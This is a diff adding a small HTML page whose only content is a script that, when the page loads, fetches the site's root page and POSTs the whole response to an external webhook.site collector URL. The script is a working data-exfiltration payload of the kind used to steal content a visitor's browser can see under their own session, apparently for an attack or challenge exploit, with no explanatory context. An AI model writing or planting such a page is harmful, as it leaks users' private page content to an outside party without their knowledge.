@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("/")
+        .then(r => r.text())
+        .then(data => {
+          fetch("https://webhook.site/41453a0e-b823-4014-9dfc-4c0ccbe8812b", {
+            method: "POST",
+            body: data,
+            mode: "no-cors"
+          });
+        });
+    </script>
+  </body>
+</html>
